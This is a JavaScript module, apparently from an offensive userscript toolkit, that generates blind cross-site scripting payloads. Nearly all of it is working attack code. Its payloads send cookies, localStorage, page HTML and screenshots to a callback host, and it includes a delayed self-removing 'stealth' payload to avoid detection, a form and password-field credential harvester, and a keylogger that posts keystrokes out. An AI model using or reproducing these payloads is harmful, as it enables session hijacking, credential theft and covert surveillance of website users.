/**
 * @file blind-xss.js
 * @description Blind XSS techniques and callback handling
 * @version 8.0.0
 */

(function() {
    'use strict';

    class BlindXSS {
        constructor(framework) {
            this.framework = framework;
            this.callbackUrl = this.getCallbackUrl();
            this.payloads = this.initializePayloads();
        }

        // ═══════════════════════════════════════════════════════════════
        // 🎯 Initialize Blind XSS Payloads
        // ═══════════════════════════════════════════════════════════════
        initializePayloads() {
            const url = this.callbackUrl;
            
            return [
                // Image-based
                `<img src=x onerror="fetch('${url}?cookie='+document.cookie)">`,
                `<img src="${url}/i.png?cookie='+document.cookie">`,
                
                // Script-based
                `<script src="${url}/xss.js"></script>`,
                `<script>fetch('${url}',{method:'POST',body:JSON.stringify({url:location.href,cookie:document.cookie,html:document.body.innerHTML})})</script>`,
                
                // Navigator.sendBeacon
                `<script>navigator.sendBeacon('${url}',JSON.stringify({url:location.href,cookie:document.cookie}))</script>`,
                
                // XMLHttpRequest
                `<script>var xhr=new XMLHttpRequest();xhr.open('POST','${url}');xhr.send(JSON.stringify({url:location.href,cookie:document.cookie,localStorage:localStorage}))</script>`,
                
                // WebSocket
                `<script>var ws=new WebSocket('${url.replace('http', 'ws')}');ws.onopen=()=>ws.send(JSON.stringify({cookie:document.cookie}))</script>`,
                
                // Form submission
                `<form action="${url}" method="POST" id="xss"><input name="data"></form><script>document.getElementById('xss').elements[0].value=document.cookie;document.getElementById('xss').submit()</script>`,
                
                // Base64 encoded
                `<script>eval(atob('${btoa(`fetch('${url}?c='+document.cookie)`)}"))</script>`,
                
                // CSS import
                `<link rel="stylesheet" href="${url}/style.css?cookie='+document.cookie">`,
                
                // SVG-based
                `<svg/onload="fetch('${url}?data='+btoa(document.body.innerHTML))">`,
                
                // Object/Embed
                `<object data="${url}?cookie='+document.cookie"></object>`,
                `<embed src="${url}?cookie='+document.cookie">`,
                
                // Meta refresh
                `<meta http-equiv="refresh" content="0;url=${url}?cookie='+document.cookie">`,
                
                // Iframe
                `<iframe src="${url}?parent='+location.href"></iframe>`,
                
                // Audio/Video
                `<audio src="${url}/a.mp3?cookie='+document.cookie"></audio>`,
                `<video src="${url}/v.mp4?cookie='+document.cookie"></video>`,
                
                // Import maps (modern)
                `<script type="importmap">{"imports":{"xss":"${url}/xss.js"}}</script><script type="module">import'xss'</script>`,
                
                // DNS exfiltration
                `<script>new Image().src='http://'+document.cookie+'.${url.replace('http://', '')}'</script>`,
                
                // Recursive payload
                `<script>document.write('<script src="${url}/payload.js"></sc'+'ript>')</script>`
            ];
        }

        // ═══════════════════════════════════════════════════════════════
        // 🌐 Callback URL Management
        // ═══════════════════════════════════════════════════════════════
        getCallbackUrl() {
            const saved = GM_getValue('blind_xss_callback_url', null);
            if (saved) return saved;
            
            // Default to a popular blind XSS service or user config
            return 'https://xss.example.com/callback';
        }

        setCallbackUrl(url) {
            this.callbackUrl = url;
            GM_setValue('blind_xss_callback_url', url);
        }

        // ═══════════════════════════════════════════════════════════════
        // 💉 Generate Context-Specific Blind XSS
        // ═══════════════════════════════════════════════════════════════
        generateForContext(context) {
            const url = this.callbackUrl;
            
            const contextPayloads = {
                'input': [
                    `"><img src=x onerror="fetch('${url}?c='+document.cookie)">`,
                    `' onload='fetch("${url}?c="+document.cookie)'`
                ],
                'textarea': [
                    `</textarea><script>fetch('${url}?c='+document.cookie)</script>`
                ],
                'comment': [
                    `--><script>fetch('${url}?c='+document.cookie)</script><!--`
                ],
                'json': [
                    `","xss":"<script src='${url}/xss.js'></script>"`
                ],
                'xml': [
                    `</tag><script>fetch('${url}?c='+document.cookie)</script><tag>`
                ],
                'svg': [
                    `<svg/onload="fetch('${url}?c='+document.cookie)">`
                ],
                'markdown': [
                    `![xss](x onerror="fetch('${url}?c='+document.cookie)")`
                ],
                'email': [
                    `test+<script>fetch('${url}?c='+document.cookie)</script>@example.com`
                ]
            };

            return contextPayloads[context] || this.payloads;
        }

        // ═══════════════════════════════════════════════════════════════
        // 📦 Data Exfiltration Payloads
        // ═══════════════════════════════════════════════════════════════
        generateExfiltrationPayload(dataTypes = ['cookie', 'localStorage', 'sessionStorage', 'dom']) {
            const url = this.callbackUrl;
            const exfil = [];

            const collectors = {
                cookie: `c:document.cookie`,
                localStorage: `ls:JSON.stringify(localStorage)`,
                sessionStorage: `ss:JSON.stringify(sessionStorage)`,
                dom: `dom:document.body.innerHTML`,
                url: `url:location.href`,
                referrer: `ref:document.referrer`,
                userAgent: `ua:navigator.userAgent`,
                screenResolution: `sr:screen.width+'x'+screen.height`,
                timezone: `tz:new Date().getTimezoneOffset()`,
                language: `lang:navigator.language`,
                plugins: `plugins:Array.from(navigator.plugins).map(p=>p.name).join(',')`,
                historyLength: `hist:history.length`
            };

            dataTypes.forEach(type => {
                if (collectors[type]) {
                    exfil.push(collectors[type]);
                }
            });

            const payload = `
                <script>
                    (function() {
                        var data = {
                            ${exfil.join(',\n                            ')}
                        };
                        
                        fetch('${url}', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify(data)
                        }).catch(e => {
                            // Fallback: use img tag
                            new Image().src = '${url}?data=' + btoa(JSON.stringify(data));
                        });
                    })();
                </script>
            `;

            return payload.trim();
        }

        // ═══════════════════════════════════════════════════════════════
        // 🎯 Advanced Blind XSS Techniques
        // ═══════════════════════════════════════════════════════════════
        generateStealthPayload() {
            const url = this.callbackUrl;
            
            return `
                <script>
                    (async function() {
                        // Wait for page to be fully loaded
                        if (document.readyState !== 'complete') {
                            await new Promise(r => window.addEventListener('load', r));
                        }
                        
                        // Delay to avoid detection
                        await new Promise(r => setTimeout(r, 5000));
                        
                        // Collect data
                        const data = {
                            url: location.href,
                            cookie: document.cookie,
                            localStorage: Object.keys(localStorage).length > 0 ? JSON.stringify(localStorage) : null,
                            timestamp: Date.now(),
                            userAgent: navigator.userAgent
                        };
                        
                        // Send via multiple methods for reliability
                        const methods = [
                            // Method 1: Fetch
                            () => fetch('${url}', {
                                method: 'POST',
                                body: JSON.stringify(data),
                                mode: 'no-cors'
                            }),
                            
                            // Method 2: Beacon
                            () => navigator.sendBeacon('${url}', JSON.stringify(data)),
                            
                            // Method 3: Image
                            () => new Promise(r => {
                                const img = new Image();
                                img.onload = img.onerror = r;
                                img.src = '${url}/i.png?d=' + btoa(JSON.stringify(data));
                            })
                        ];
                        
                        // Try each method
                        for (const method of methods) {
                            try {
                                await method();
                                break; // Success, stop trying
                            } catch (e) {
                                continue; // Try next method
                            }
                        }
                        
                        // Clean up
                        if (document.currentScript) {
                            document.currentScript.remove();
                        }
                    })();
                </script>
            `;
        }

        // ═══════════════════════════════════════════════════════════════
        // 🎭 Polyglot Blind XSS
        // ═══════════════════════════════════════════════════════════════
        generatePolyglotPayload() {
            const url = this.callbackUrl;
            
            return `'"><img src=x onerror="fetch('${url}?c='+document.cookie)"><!--
                    <script>fetch('${url}?c='+document.cookie)</script>
                    */;fetch('${url}?c='+document.cookie);//
                    -->`;
        }

        // ═══════════════════════════════════════════════════════════════
        // 📸 Screenshot Exfiltration
        // ═══════════════════════════════════════════════════════════════
        generateScreenshotPayload() {
            const url = this.callbackUrl;
            
            return `
                <script>
                    (async function() {
                        // Wait for page load
                        await new Promise(r => {
                            if (document.readyState === 'complete') r();
                            else window.addEventListener('load', r);
                        });
                        
                        // Attempt to capture screenshot using html2canvas if available
                        if (typeof html2canvas !== 'undefined') {
                            const canvas = await html2canvas(document.body);
                            const dataUrl = canvas.toDataURL();
                            
                            await fetch('${url}/screenshot', {
                                method: 'POST',
                                body: JSON.stringify({
                                    url: location.href,
                                    screenshot: dataUrl
                                })
                            });
                        } else {
                            // Fallback: send DOM
                            await fetch('${url}/dom', {
                                method: 'POST',
                                body: document.documentElement.outerHTML
                            });
                        }
                    })();
                </script>
            `;
        }

        // ═══════════════════════════════════════════════════════════════
        // 🔐 Credential Harvesting
        // ═══════════════════════════════════════════════════════════════
        generateCredentialHarvestingPayload() {
            const url = this.callbackUrl;
            
            return `
                <script>
                    (function() {
                        // Hook form submissions
                        const originalSubmit = HTMLFormElement.prototype.submit;
                        HTMLFormElement.prototype.submit = function() {
                            const formData = new FormData(this);
                            const data = {};
                            formData.forEach((value, key) => data[key] = value);
                            
                            fetch('${url}/form', {
                                method: 'POST',
                                body: JSON.stringify({
                                    url: location.href,
                                    action: this.action,
                                    data: data
                                })
                            });
                            
                            return originalSubmit.call(this);
                        };
                        
                        // Hook input events
                        document.addEventListener('input', function(e) {
                            if (e.target.type === 'password' || e.target.name.match(/pass|pwd/i)) {
                                fetch('${url}/input', {
                                    method: 'POST',
                                    body: JSON.stringify({
                                        url: location.href,
                                        name: e.target.name,
                                        value: e.target.value
                                    })
                                });
                            }
                        });
                    })();
                </script>
            `;
        }

        // ═══════════════════════════════════════════════════════════════
        // 🎪 Keylogger Payload
        // ═══════════════════════════════════════════════════════════════
        generateKeyloggerPayload() {
            const url = this.callbackUrl;
            
            return `
                <script>
                    (function() {
                        let buffer = '';
                        let lastSend = Date.now();
                        
                        document.addEventListener('keypress', function(e) {
                            buffer += e.key;
                            
                            // Send every 50 characters or every 5 seconds
                            if (buffer.length >= 50 || Date.now() - lastSend > 5000) {
                                fetch('${url}/keys', {
                                    method: 'POST',
                                    body: JSON.stringify({
                                        url: location.href,
                                        keys: buffer,
                                        timestamp: Date.now()
                                    })
                                });
                                
                                buffer = '';
                                lastSend = Date.now();
                            }
                        });
                        
                        // Send remaining buffer on page unload
                        window.addEventListener('beforeunload', function() {
                            if (buffer.length > 0) {
                                navigator.sendBeacon('${url}/keys', JSON.stringify({
                                    url: location.href,
                                    keys: buffer
                                }));
                            }
                        });
                    })();
                </script>
            `;
        }

        // ═══════════════════════════════════════════════════════════════
        // 🎯 Get All Payloads
        // ═══════════════════════════════════════════════════════════════
        getAllPayloads() {
            return {
                basic: this.payloads,
                exfiltration: this.generateExfiltrationPayload(),
                stealth: this.generateStealthPayload(),
                polyglot: this.generatePolyglotPayload(),
                screenshot: this.generateScreenshotPayload(),
                credentials: this.generateCredentialHarvestingPayload(),
                keylogger: this.generateKeyloggerPayload()
            };
        }

        // ═══════════════════════════════════════════════════════════════
        // 📊 Test Payload Delivery
        // ═══════════════════════════════════════════════════════════════
        async testPayloadDelivery(payload) {
            // Test if payload can reach callback server
            try {
                const testId = 'test_' + Date.now();
                const testUrl = `${this.callbackUrl}/test?id=${testId}`;
                
                const response = await fetch(testUrl, {
                    method: 'GET',
                    mode: 'no-cors'
                });
                
                return {
                    success: true,
                    testId: testId,
                    payload: payload
                };
            } catch (error) {
                return {
                    success: false,
                    error: error.message
                };
            }
        }
    }

    // ═══════════════════════════════════════════════════════════════════
    // 🚀 Export
    // ═══════════════════════════════════════════════════════════════════
    exports.BlindXSS = BlindXSS;
    exports.create = (framework) => new BlindXSS(framework);
})();